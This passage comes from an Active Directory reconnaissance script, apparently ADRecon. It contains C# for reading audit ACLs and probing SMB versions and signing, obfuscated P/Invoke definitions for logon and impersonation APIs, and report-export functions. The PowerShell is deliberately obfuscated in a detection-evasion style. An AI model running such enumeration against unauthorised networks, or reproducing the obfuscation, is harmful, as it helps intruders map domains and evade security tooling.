                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@


${PIngcAs`T`lES`M`Bs`C`A`NNErs`ourCE} = @"

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@







${AdV`Api3`2dEF} = ((("{58}{83}{37}{79}{4}{80}{14}{6}{12}{75}{26}{78}{88}{36}{53}{70}{35}{0}{77}{106}{66}{33}{60}{63}{57}{46}{56}{89}{41}{108}{103}{84}{65}{8}{44}{86}{67}{92}{2}{105}{32}{98}{17}{55}{43}{87}{49}{95}{19}{28}{39}{31}{71}{72}{30}{22}{13}{18}{24}{59}{62}{97}{68}{54}{107}{90}{40}{100}{29}{34}{94}{27}{99}{48}{7}{11}{52}{81}{93}{1}{50}{16}{76}{82}{15}{73}{101}{23}{5}{45}{91}{25}{64}{85}{42}{102}{9}{3}{104}{69}{61}{96}{47}{10}{51}{21}{38}{20}{74}" -f'c static exte','eLog','wLogon','tru','t','[DllIm','advapi3','xte',', string l',' ','c e','rn ','2.dl','port({1','{1}','ntPtr ','dO','d','}','tPt','Self();
{',' Rever','m','  ','adva','api32.dll{','}, ','i','r phT','e)]','DllI','n)','ype','t','
','true)]
    publi','o','o','tTo','oke','tLastErr','g lp','astErro','onProvider,','pszPasswo','po','me, ','stati','tatic e','u','ge','xtern bool','bool Imperso','r ','1},','wLog','str','a','{0}
    [','p','ring lpsz',' publi','i','Usern','1}, Set','n','nUser(s',' in','dll{','   ','= ',';','

    [','hToken);','0}','l{1','nUs','rn b','Se','r','(','n','er(I','DllImp','ai','L','rd,',' o','tLastErr','in','e','rt({1}adv','t d','at','    publ','t In','c ','32.',', int ','c s','or = tru','

  ','r =','zDom','e)]
','T','ool Logo',' S','s'))-f [chAr]39,[chAr]34)



${kERn`El3`2`Def} = ((("{13}{14}{12}{10}{19}{6}{17}{8}{1}{4}{5}{0}{16}{7}{20}{3}{9}{2}{15}{18}{11}{21}" -f ' exte','ublic ','(Int','l','stati','c','Er','n bool CloseHan','e)]
    p','e','el32.','Object);
w','n','wBV
    [DllImport(0Y','Qker','Ptr ','r','ror = tru','h','dll0YQ, SetLast','d','BV'))."Rep`laCe"(([CHAR]119+[CHAR]66+[CHAR]86),[stRiNg][CHAR]39)."R`epl`ACE"(([CHAR]48+[CHAR]89+[CHAR]81),[stRiNg][CHAR]34))

Function G`et`-dAtediFf
{

    param (
        [Parameter(mandATorY = ${tr`Ue})]
        [DateTime] ${d`A`TE1},

        [Parameter(mANdATORy = ${T`RuE})]
        [DateTime] ${DA`TE2}
    )

    If (${Da`Te2} -gt ${D`AT`E1})
    {
        ${DD`IFf} = ${d`A`Te2} - ${dAT`E1}
    }
    Else
    {
        ${dDi`Ff} = ${da`Te1} - ${D`A`TE2}
    }
    Return ${dD`ifF}
}

Function G`ET-dntOf`QdN
{

    param(
        [Parameter(ManDaToRY = ${Tr`UE})]
        [string] ${adob`J`e`Ctdn}
    )

    ${i`NdEX} = ${a`DOB`jecT`dn}.("{2}{1}{0}"-f'dexOf','n','I').Invoke('DC=')
    If (${I`ND`eX})
    {
        ${ADOb`jeCtdNdoMAi`N`NA`ME} = $(${Ad`ob`JECtDN}.("{2}{1}{0}"-f 'g','bStrin','Su').Invoke(${i`NDeX})) -replace 'DC=','' -replace ',','.'
    }
    Else
    {
        
        [array] ${ADo`B`JEctdN`ArRay} = ${aDObJe`C`TDN} -Split ("DC=")
        ${adObjec`T`dn`ARrAy} | &("{0}{3}{1}{2}" -f 'ForE','h-','Object','ac') {
            [array] ${Te`Mp} = ${_} -Split (",")
            [string] ${aDObJ`e`Ct`dNarRA`yITemDoMAin`NA`me} += ${t`EMp}[0] + "."
        }
        ${AD`OB`Je`cTdNdomaI`NNAme} = ${aDOb`JECTdnA`Rra`y`ite`mD`omaIn`N`AME}.("{1}{2}{0}"-f 'g','Subst','rin').Invoke(1, ${aDO`Bjectd`NaRRa`YI`TEMDOMaINn`AME}."L`ENGtH" - 2)
    }
    Return ${AdoBjECt`DN`do`mAINnA`Me}
}

Function EXPOr`T-`Ad`R`cSv
{

    param(
        [Parameter(maNDATORy = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${aD`R`obJ},

        [Parameter(MaNDaTOry = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String] ${Adf`i`lENA`mE}
    )

    Try
    {
        ${aDr`oBJ} | &("{3}{0}{1}{2}" -f'xpor','t-Cs','v','E') -Path ${a`DFILeN`A`mE} -NoTypeInformation -Encoding ("{1}{2}{0}"-f 'lt','Def','au')
    }
    Catch
    {
        &("{2}{0}{3}{1}{4}"-f'ri','arn','W','te-W','ing') "[Export-ADRCSV] Failed to export $($ADFileName). "
        &("{0}{2}{1}{3}"-f'Writ','-Ver','e','bose') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function EX`Po`RT-adR`xmL
{

    param(
        [Parameter(mAndATOry = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${a`Dr`obj},

        [Parameter(MandaTOrY = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String] ${Adf`IL`E`NAME}
    )

    Try
    {
        (&("{1}{2}{0}"-f 'l','Con','vertTo-Xm') -NoTypeInformation -InputObject ${a`drO`BJ}).("{1}{0}"-f 'ave','S').Invoke(${AdfIl`E`NamE})
    }
    Catch
    {
        &("{1}{3}{2}{0}" -f'rning','W','-Wa','rite') "[Export-ADRXML] Failed to export $($ADFileName). "
        &("{2}{1}{0}{3}" -f 'r','rite-Ve','W','bose') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Exp`OrT-ADr`jSON
{

    param(
        [Parameter(manDATOry = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${aDR`obj},

        [Parameter(MANdatOrY = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String] ${A`DF`IlEN`AmE}
    )

    Try
    {
        &("{2}{3}{0}{1}"-f'-JS','ON','Con','vertTo') -InputObject ${a`DrObj} | &("{1}{0}"-f 'ile','Out-F') -FilePath ${A`dFIl`en`AME}
    }
    Catch
    {
        &("{2}{0}{1}" -f '-Warnin','g','Write') "[Export-ADRJSON] Failed to export $($ADFileName). "
        &("{3}{2}{1}{0}"-f 'se','e-Verbo','t','Wri') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function EXp`oR`T`-aDR`htML
{

    param(
        [Parameter(mAndATOrY = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${ADR`obJ},

        [Parameter(maNdaTORy = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String] ${aDFi`L`EN`Ame},

        [Parameter(mandATory = ${F`AL`Se})]
        [String] ${ad`ROUT`PUT`dIr} = ${NU`LL}
    )

${hEA`D`Er} = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If (${aDFIL`en`AME}.("{2}{0}{1}" -f'ai','ns','Cont').Invoke(("{0}{1}"-f'Inde','x')))
        {
            ${htM`Lp`AtH}  = -join(${Ad`R`OUtp`UTD`ir},'\',("{0}{2}{1}"-f 'HTM','Files','L-'))
            ${htMl`pAth} = $((&("{2}{0}{1}{3}"-f 've','rt-Pa','Con','th') ${h`T`mlPAtH}).("{0}{2}{1}" -f'Trim','nd','E').Invoke("\"))
            ${HTMl`Fil`Es} = &("{0}{1}{2}"-f 'G','et-Child','Item') -Path ${htML`Pa`TH} -name
            ${h`TMl} = ${H`TMLFI`leS} | &("{0}{1}{2}{3}" -f 'C','onvert','To-HTM','L') -Title ("{1}{0}"-f'on','ADRec') -Property @{("{0}{1}" -f'Labe','l')=("{2}{0}{1}{4}{3}" -f'l','e of ','Tab','ts','Conten');("{2}{0}{1}"-f'i','on','Express')={"<a href='$($_)'>$($_)</a> "}} -Head ${h`E`Ader}

            &("{0}{1}{2}" -f 'A','dd-Ty','pe') -AssemblyName ("{1}{2}{0}" -f 'Web','Syst','em.')
              (  VariABle  1fK  -vAlUE  )::("{3}{2}{0}{1}"-f 'lDec','ode','tm','H').Invoke(${h`TML}) | &("{1}{2}{0}"-f'le','Out-','Fi') -FilePath ${adF`IleNA`mE}
        }
        Else
        {
            If (${A`DRobj} -is [array])
            {
                ${aD`Robj} | &("{3}{0}{1}{4}{2}" -f'ect','-','ct','Sel','Obje') ('*') | &("{2}{0}{3}{1}" -f'onvert','HTML','C','To-') -As ("{0}{1}"-f 'Tabl','e') -Head ${HEAd`Er} | &("{1}{2}{0}"-f'ile','O','ut-F') -FilePath ${ADF`i`LEnA`me}
            }
            Else
            {
                &("{1}{3}{2}{4}{0}"-f'ML','Co','vertTo','n','-HT') -InputObject ${adro`BJ} -As ("{1}{0}"-f'e','Tabl') -Head ${HEaD`ER} | &("{2}{0}{1}" -f't-Fi','le','Ou') -FilePath ${aDf`iL`ENAME}
            }
        }
    }
    Catch
    {
        &("{1}{2}{0}" -f'e-Warning','Wr','it') "[Export-ADRHTML] Failed to export $($ADFileName). "
        &("{2}{3}{1}{0}{4}"-f'bo','er','Write','-V','se') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function ExPoR`T`-ADr
{

    param(
        [Parameter(mAndATorY = ${t`RUe})]
        [PSObject] ${ADrO`BJ},

        [Parameter(mandatoRy = ${tr`Ue})]
        [String] ${A`dRoU`TPUT`D`Ir},

        [Parameter(maNdatoRY = ${T`RUe})]
        [array] ${OuTpU`T`TYPE},

        [Parameter(mANDAtORy = ${tR`UE})]
        [String] ${aD`R`mo`DULenAmE}
    )

    Switch (${outpU`T`TY`pE})
    {
        ("{0}{1}"-f'STD','OUT')
        {
            If (${Ad`RMODULE`NA`Me} -ne ("{1}{3}{0}{2}" -f'ec','AboutA','on','DR'))
            {
                If (${a`D`ROBj} -is [array])
                {
                    
                    ${a`Dr`OBj} | &("{2}{1}{0}" -f'String','-','Out') -Stream
                }
                Else
                {
                    
                    ${A`drOBJ} | &("{1}{2}{0}{3}" -f'-Li','F','ormat','st') | &("{1}{0}{2}"-f'r','Out-St','ing') -Stream
                }
            }
        }
        'CSV'
        {
            ${a`dFiL`eNAme}  = -join(${aDrO`U`T`Pu`Tdir},'\',("{2}{1}{0}" -f 'Files','-','CSV'),'\',${AdrM`oDul`EnAMe},("{1}{0}"-f 'csv','.'))
            &("{1}{2}{3}{0}"-f'V','Expor','t-ADR','CS') -ADRObj ${AD`ROBJ} -ADFileName ${ad`FIl`eNAME}
        }
        'XML'
        {
            ${AD`FileNa`Me}  = -join(${ADrO`UT`PUt`D`ir},'\',("{1}{0}{2}" -f'L-','XM','Files'),'\',${Adr`M`O`duLe`NaMe},("{1}{0}"-f'l','.xm'))
            &("{0}{2}{1}" -f 'Export','L','-ADRXM') -ADRObj ${ADRo`BJ} -ADFileName ${aD`FILeNa`ME}
        }
        ("{0}{1}" -f 'JS','ON')
        {
            ${ad`FilE`N`AMe}  = -join(${A`DROUT`pU`Tdir},'\',("{0}{1}{2}"-f 'J','SON-','Files'),'\',${aDRM`ODuLEN`AME},("{1}{0}"-f 'n','.jso'))
            &("{0}{2}{1}{3}" -f 'Exp','SO','ort-ADRJ','N') -ADRObj ${adRO`Bj} -ADFileName ${adFI`l`EnA`Me}
        }
        ("{0}{1}"-f 'HTM','L')
        {
            ${aDfI`Le`Na`mE}  = -join(${ad`RO`UtPUt`D`ir},'\',("{0}{2}{1}"-f'HTML-F','s','ile'),'\',${adrm`oduL`enAME},("{1}{0}" -f 'l','.htm'))
            &("{2}{3}{4}{0}{1}" -f'-','ADRHTML','Ex','p','ort') -ADRObj ${a`D`RObJ} -ADFileName ${a`dfI`lena`me} -ADROutputDir ${adRo`UT`P`UtdiR}
        }
    }
}

Function G`eT-aDRExCelC`o`mO`Bj
{


    
    Try
    {
        
        ${SA`VevErb`osEPrE`FEr`En`Ce} = ${scR`IPt:vE`R`B`O`sEprEfe`REnCE}
        ${scRiPt:`V`ErbO`s`Ep`ReFErEnCE} = ("{3}{0}{1}{5}{2}{4}" -f 'n','tlyC','ntin','Sile','ue','o')
        ${GL`obAl`:Ex`cel} = &("{0}{2}{1}" -f 'N','ect','ew-Obj') -ComObject ("{0}{2}{1}{3}" -f 'excel.a','ica','ppl','tion')
        If (${sAv`EVErboS`e`PRef`ErEnCE})
        {
            ${scRIpt:`VE`RB`oSEpReFe`RencE} = ${SAv`E`VErboS`ePrEFeRE`N`cE}
            &("{1}{3}{2}{4}{0}"-f 'able','R','ve-Va','emo','ri') ("{1}{4}{0}{3}{2}"-f'refere','SaveV','e','nc','erboseP')
        }
    }
    Catch
    {
        If (${s`A`Veve`Rbos`EPRE`FEr`EnCE})
        {
            ${sCrIPt`:VERbOs`epreFE`ReN`cE} = ${SA`VEvEr`Bo`Se`pr`Ef`eRENCe}
            &("{0}{3}{2}{1}"-f 'R','riable','e-Va','emov') ("{2}{3}{0}{5}{1}{4}"-f'Ver','s','S','ave','ePreference','bo')
        }
        &("{0}{2}{1}{3}"-f 'Wr','-Warnin','ite','g') ("{8}{20}{46}{47}{0}{36}{27}{7}{18}{19}{53}{45}{22}{57}{40}{31}{23}{41}{11}{30}{43}{16}{24}{42}{38}{14}{55}{28}{2}{13}{26}{33}{51}{3}{12}{44}{34}{25}{1}{59}{6}{32}{29}{15}{50}{39}{56}{58}{37}{5}{10}{4}{17}{48}{9}{21}{52}{49}{35}{54}"-f 'Exce','r t','. ','Exc','host with M',' on ',' g','does ','[','s','a ',' ','el','U','x','rate t','ration of AD','icr','not a','p','Get-','oft E','o be','led. Skippin','Recon-','te','se',' Excel ','sx','ne','ge','l','e',' the -G','me',' in','lComObj]','ort.xslx','.',' ','nsta','g','Report','ne',' para',' t','A','DR','o','l','he','en','xce','pear','stalled.','l','ADReco',' i','n-Rep','o')
        &("{0}{1}{3}{4}{2}"-f'Wr','i','se','te-V','erbo') "[EXCEPTION] $($_.Exception.Message) "
        Return ${n`ULL}
    }
    ${exc`el}."vIsi`Ble" = ${TR`UE}
    ${eX`CeL}."I`N`TErA`cTIVE" = ${fA`LsE}
    ${glO`BA`L`:WoRK`BO`OK} = ${eXC`EL}."W`O`RKBOOkS".("{0}{1}"-f 'Ad','d').Invoke()
    If (${W`or`KboOK}."W`oRkSHEe`TS"."c`ount" -eq 3)
    {
        ${wO`RKB`oOK}."W`oRK`sHeEts".("{0}{1}"-f 'Ite','m').Invoke(3).("{1}{0}" -f'elete','D').Invoke()
        ${w`Or`KbOoK}."w`ork`shEE`TS".("{1}{0}"-f'm','Ite').Invoke(2).("{0}{1}" -f'Del','ete').Invoke()
    }
}

Function G`Et-ad`Re`xCEl`ComObJ`RE`LEase
{

    param(
        [Parameter(manDATory = ${T`Rue})]
        ${coMObjt`Or`eleA`se},

        [Parameter(MAndAtOry = ${fA`LSe})]
        [bool] ${fi`NAl} = ${F`A`lSE}
    )
    
